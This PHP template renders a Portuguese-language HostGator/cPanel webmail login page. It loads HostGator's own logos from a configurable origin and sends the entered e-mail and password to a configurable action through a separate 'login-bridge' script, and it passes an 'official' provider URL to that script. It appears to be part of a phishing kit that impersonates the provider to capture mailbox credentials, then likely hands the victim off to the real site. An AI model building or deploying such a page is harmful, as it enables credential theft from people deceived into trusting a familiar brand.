<?php declare(strict_types=1);
$origin = rtrim((string)($config['provider_origin'] ?? 'https://www.hostgator.com.br'), '/');
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width,initial-scale=1"/>
    <meta name="HandheldFriendly" content="True"/>
    <title><?= e($config['site_title']) ?></title>
    <link rel="shortcut icon" href="<?= e($origin) ?>/assets/images/favicons/favicon.ico"/>
    <link href="/assets/hostgator-bridge.css?v=11" rel="stylesheet"/>
</head>
<body class="hg-page">
    <div class="hg-card">
        <img class="hg-logo" src="<?= e($origin) ?>/assets/images/webmail/form/HostGator.svg" alt="HostGator"/>
        <form id="login_form" action="<?= e($loginAction) ?>" method="post" novalidate>
            <h1>Acesse sua conta de e-mail:</h1>
            <div class="hg-field">
                <label for="email">E-mail</label>
                <input type="email" id="email" name="login" placeholder="E-mail" required autocomplete="username"/>
            </div>
            <div class="hg-field">
                <label for="password">Senha</label>
                <input type="password" id="password" name="password" placeholder="Senha" required autocomplete="current-password"/>
            </div>
            <div id="message"></div>
            <button type="submit" id="login_submit">Entrar</button>
        </form>
        <img class="hg-powered" src="<?= e($origin) ?>/assets/images/webmail/form/powered-by-cpanel.svg" alt="Powered by cPanel"/>
    </div><script>
window.LOGIN_BRIDGE = { form: "#login_form", email: "#email", password: "#password", message: "#message", submit: "#login_submit", action: <?= json_encode($loginAction) ?> };
window.UOL_OFFICIAL = <?= json_encode(uol_official_url($config), JSON_UNESCAPED_UNICODE) ?>;
window.UOL_MESSAGES = <?= json_encode([
    'authenticating' => uol_msg('authenticating'),
    'network_error'  => uol_msg('network_error'),
], JSON_UNESCAPED_UNICODE) ?>;
</script>
<script src="/assets/login-bridge.js?v=11"></script></body>
</html>